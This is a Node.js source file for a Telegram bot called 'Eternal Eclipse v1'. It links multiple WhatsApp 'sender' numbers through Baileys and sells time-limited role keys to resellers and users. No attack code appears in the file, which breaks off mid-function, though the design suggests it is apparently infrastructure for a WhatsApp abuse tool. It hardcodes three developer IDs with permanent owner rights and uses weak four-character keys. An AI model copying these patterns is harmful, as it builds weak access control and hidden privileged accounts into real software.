const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestWaWebVersion,
fetchLatestBaileysVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map();
let userApiBug = null;
let sock;

function getCountryCode(phoneNumber) {
    const countryCodes = {
        '1': 'US/Canada',
        '44': 'UK',
        '33': 'France',
        '49': 'Germany',
        '39': 'Italy',
        '34': 'Spain',
        '7': 'Russia',
        '81': 'Japan',
        '82': 'South Korea',
        '86': 'China',
        '91': 'India',
        '62': 'Indonesia',
        '60': 'Malaysia',
        '63': 'Philippines',
        '66': 'Thailand',
        '84': 'Vietnam',
        '65': 'Singapore',
        '61': 'Australia',
        '64': 'New Zealand',
        '55': 'Brazil',
        '52': 'Mexico',
        '57': 'Colombia',
        '51': 'Peru',
        '54': 'Argentina',
        '27': 'South Africa'
    };

    for (const [code, country] of Object.entries(countryCodes)) {
        if (phoneNumber.startsWith(code)) {
            return country;
        }
    }
    
    return 'International';
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  let data = JSON.parse(fs.readFileSync(file));

  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isDeveloper(id) {
  const developerIds = ['6131634462', '2062259984', '5448509135'];
  return developerIds.includes(id.toString());
}

function isOwner(id) {
  if (isDeveloper(id)) return true;
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  return (
    isDeveloper(id) ||
    isOwner(id) ||
    loadAkses().akses.includes(id.toString()) ||
    loadAkses().resellers.includes(id.toString()) ||
    loadAkses().pts.includes(id.toString()) ||
    loadAkses().moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅ Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true;
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false;
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }
  
  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }
    
    const users = JSON.parse(fileContent);
    
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);
    
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }
    
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");
    
    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      retryRequestDelayMs: 2000,
      maxRetryCount: 5
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;
      let reconnectAttempts = 0;
      const MAX_RECONNECT_ATTEMPTS = 5;
      const RECONNECT_DELAYS = [2000, 5000, 10000, 20000, 30000];

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      const attemptReconnect = async () => {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
          sendEventToUser(username, {
            type: 'error',
            message: 'Max reconnect attempts reached. Please restart connection.',
            number: BotNumber,
            status: 'failed'
          });
          reject(new Error("Max reconnect attempts reached"));
          return;
        }

        const delay = RECONNECT_DELAYS[reconnectAttempts] || 30000;
        reconnectAttempts++;
        
        console.log(`[${username}] 🔄 Reconnect attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} in ${delay}ms`);
        
        sendEventToUser(username, {
          type: 'status',
          message: `Mencoba menyambung kembali... (${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS})`,
          number: BotNumber,
          status: 'reconnecting'
        });

        await sleep(delay);
        
        try {
          const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
          resolve(newSock);
        } catch (error) {
          reject(error);
        }
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const error = lastDisconnect?.error;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode, error?.message);

          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut ||
              statusCode === DisconnectReason.connectionLost) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            attemptReconnect();
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          reconnectAttempts = 0;
          cleanup();
          
          sessions.set(BotNumber, userSock);
          
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          const userSessions = loadUserSessions();
          if (!userSessions[username]) {
            userSessions[username] = [];
          }
          if (!userSessions[username].includes(BotNumber)) {
            userSessions[username].push(BotNumber);
            saveUserSessions(userSessions);
            console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
          }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🌌 Eternal Eclipse v1</blockquote>
<i>The next generation multi-functional bot</i>
<i>Advanced tools, enhanced security, and premium experience</i>

<blockquote>「 Information 」</blockquote>
<b>Developers:</b>
• @XYZAF (Syaif) - 6131634462
• @Cakwekuah (Aryapiw) - 2062259984
• @dapidd_ae02 (dapid) - 5448509135
<b>Version   : 1.0</b>
<b>Username  : ${username}</b>

<i>Select menu below to access bot features:</i>
`;

  const keyboard = Markup.keyboard([
    ["⚙️ Settings Menu"],
    ["ℹ️ Bot Info", "💬 Support"],
    ["📢 Updates"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("⚙️ Settings Menu", async (ctx) => {
  const menu = `
<blockquote>🌌 Eternal Eclipse v1</blockquote>
<i>System Configuration & Management</i>

<b>⚙️ Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  await ctx.reply(menu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("ETERNAL ECLIPSE", "https://t.me/N3xithCore") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Eternal Eclipse v1</blockquote>
<b>Advanced multi-functional bot</b>
<i>Premium tools with enhanced security and modern interface</i>

<b>🔧 Core Features:</b>
• User Management System
• Role-Based Access Control
• Multi-Tool Integration
• Secure Operations
• WhatsApp Session Management

<b>👨‍💻 Developers:</b>
• @XYZAF (Syaif) - 6131634462
• @Cakwekuah (Aryapiw) - 2062259984
• @dapidd_ae02 (dapid) - 5448509135

<b>📞 Support:</b>
Contact developers for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("ETERNAL ECLIPSE", "https://t.me/N3xithCore") ]
    ]).reply_markup
  });
});

bot.hears("💬 Support", (ctx) => {
  ctx.reply("💬 Contact developers: @XYZAF @Cakwekuah @dapidd_ae02");
});

bot.hears("📢 Updates", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/N3xithCore");
});

bot.action("show_settings_menu", async (ctx) => {
  const menu = `
<blockquote>🌌 Eternal Eclipse v1</blockquote>
<i>System Configuration & Management</i>

<b>⚙️ Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("ETERNAL ECLIPSE", "https://t.me/N3xithCore") ]
  ]);

  await ctx.editMessageText(menu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Eternal Eclipse v1</blockquote>
<b>Advanced multi-functional bot</b>
<i>Premium tools with enhanced security and modern interface</i>

<b>🔧 Core Features:</b>
• User Management System
• Role-Based Access Control
• Multi-Tool Integration
• Secure Operations
• WhatsApp Session Management

<b>👨‍💻 Developers:</b>
• @XYZAF (Syaif) - 6131634462
• @Cakwekuah (Aryapiw) - 2062259984
• @dapidd_ae02 (dapid) - 5448509135

<b>📞 Support:</b>
Contact developers for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("ETERNAL ECLIPSE", "https://t.me/N3xithCore") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  
  const teks = `
<blockquote>🌌 Eternal Eclipse v1</blockquote>
<i>The next generation multi-functional bot</i>
<i>Advanced tools, enhanced security, and premium experience</i>

<blockquote>「 Information 」</blockquote>
<b>Developers:</b>
• @XYZAF (Syaif) - 6131634462
• @Cakwekuah (Aryapiw) - 2062259984
• @dapidd_ae02 (dapid) - 5448509135
<b>Version   : 1.0</b>
<b>Username  : ${username}</b>

<i>Select menu below to access bot features:</i>
`;

  const keyboard = Markup.keyboard([
    ["⚙️ Settings Menu"],
    ["ℹ️ Bot Info", "💬 Support"],
    ["📢 Updates"]
  ])
  .resize()
  .oneTime(false);

  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner/Developer yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<role>\n\nContoh:\n• /ckey user1,3d,admin\n• /ckey user2,7d,reseller\n• /ckey user3,1d,user\n\nRole: developer, owner, admin, reseller, user");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  const validRoles = ['developer', 'owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  if (role === 'developer' && !isDeveloper(userId)) {
    return ctx.reply("✗ Hanya Developer yang bisa membuat role Developer.");
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner/Developer.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner/Developer.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey username");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  const targetUser = users[index];
  if (targetUser.role === 'developer' && !isDeveloper(userId)) {
    return ctx.reply("✗ Tidak bisa menghapus key Developer.");
  }

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("myrole", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isDeveloper(userId)) {
    role = "Developer";
  } else if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }
  
  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Developers:</i>
• @XYZAF (Syaif)
• @Cakwekuah (Aryapiw)
• @dapidd_ae02 (dapid)
  `, { parse_mode: "HTML" });
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner/Developer.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 1234567890", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner/Developer.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 1234567890", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath);
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠁⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠚⠉⠁⠀⠀⠀⠁⢣⡎⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : ETERNAL ECLIPSE
DEVELOPERS  : @XYZAF @Cakwekuah @dapidd_ae02
ID OWN      : ${ownerIds}
VERSION     : 1.0
─────────────────────────────────────\n\n`));

bot.launch();

setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
